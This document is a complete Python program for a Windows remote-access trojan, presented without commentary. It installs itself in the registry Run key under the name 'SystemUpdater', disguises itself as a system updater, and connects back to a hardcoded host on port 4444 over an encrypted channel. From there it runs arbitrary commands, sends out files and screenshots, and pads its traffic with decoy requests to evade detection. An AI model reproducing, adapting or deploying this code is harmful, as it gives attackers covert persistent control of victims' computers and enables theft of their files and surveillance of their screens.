import socket
import subprocess
import os
import platform
import time
import random
import base64
from cryptography.fernet import Fernet
from PIL import Image
import io
import pyautogui
import requests
import winreg

def add_persistence():
    if platform.system() == "Windows":
        key_path = r"Software\Microsoft\Windows\CurrentVersion\Run"
        try:
            reg_key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, key_path, 0, winreg.KEY_SET_VALUE)
            winreg.SetValueEx(reg_key, "SystemUpdater", 0, winreg.REG_SZ, f'"{os.path.abspath(__file__)}.exe"')
            winreg.CloseKey(reg_key)
        except:
            pass

def capture_screenshot():
    screenshot = pyautogui.screenshot()
    img_byte_arr = io.BytesIO()
    screenshot.save(img_byte_arr, format="PNG")
    return img_byte_arr.getvalue()

def handle_command(cmd, s, fernet):
    if cmd.startswith("upload:"):
        file_path = cmd.split(":")[1]
        try:
            with open(file_path, "rb") as f:
                s.send(fernet.encrypt(f.read()))
        except:
            s.send(fernet.encrypt(b"File not found"))
    elif cmd == "screenshot":
        s.send(fernet.encrypt(capture_screenshot()))
    else:
        output = subprocess.getoutput(cmd)
        s.send(fernet.encrypt(output.encode()))

def blend_traffic():
    headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"}
    try:
        requests.get("https://www.microsoft.com", headers=headers, timeout=5)
    except:
        pass

KEY_FILE = "secret.key"
try:
    with open(KEY_FILE, "rb") as f:
        key = f.read().decode()
except FileNotFoundError:
    key = "lHMpfXbi2kdfRzKjvUyj-E-2IY4sWyF_EoCp2sU7siU=" # Fallback to hardcoded key if file not found

def reverse_shell(host="192.168.100.9", port=4444, key=key):
    fernet = Fernet(key.encode())
    add_persistence()

    while True:
        try:
            blend_traffic()
            time.sleep(random.randint(1, 10))
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((host, port))

            while True:
                cmd = fernet.decrypt(s.recv(4096)).decode()
                if cmd.lower() == "exit":
                    break
                handle_command(cmd, s, fernet)
        except Exception as e:
            time.sleep(5)
            continue
        finally:
            s.close()

if __name__ == "__main__":
    import argparse
    parser = argparse.ArgumentParser(description="System Updater")
    parser.add_argument("--host", default="192.168.100.9", help="Host to connect to")
    parser.add_argument("--port", type=int, default=4444, help="Port to connect to")
    parser.add_argument("--key", default="lHMpfXbi2kdfRzKjvUyj-E-2IY4sWyF_EoCp2sU7siU=", help="Encryption key")
    args = parser.parse_args()
    reverse_shell(host=args.host, port=args.port, key=args.key)
